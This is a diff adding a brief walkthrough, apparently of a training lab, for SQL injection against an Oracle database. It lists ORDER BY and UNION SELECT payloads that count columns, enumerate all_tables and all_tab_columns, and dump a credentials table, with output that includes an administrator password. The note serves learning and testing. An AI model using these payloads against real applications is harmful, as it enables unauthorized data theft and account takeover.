@@ -1,0 +1,36 @@
+SQL injection attack - listing the database contents on Oracle.
+
+End Goal:  
+1. to determine which table contains usernames and passwords
+2. determine column name in table
+3. output the content of the table
+4. login as administrator usernames
+
+Analysis:
+1. Determine the number of columns.
+
+-> ' ORDER BY 1--
+   ' ORDER BY 2--
+   ' ORDER BY 3-- (internal server error)
+
+2. Determine the datatype of columns.
+
+-> ' UNION SELECT 'a', 'a' FROM DUAL-- (Oracle database)
+
+3. Output the list of tables in Oracle database.
+
+-> ' UNION SELECT table_name, NULL FROM all_tables--
+
+-> USERS_HTSUOA
+
+4. Output the column names of the user table.
+
+-> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_HTSUOA'--
+
+-> USERNAME_BIHQTO, PASSWORD_PBIRXZ
+
+5. Output the usernames and passwords.
+
+-> ' UNION SELECT USERNAME_BIHQTO, PASSWORD_PBIRXZ FROM USERS_HTSUOA--
+
+-> administrator, jqpoqeh5tn7z9d2w1so2
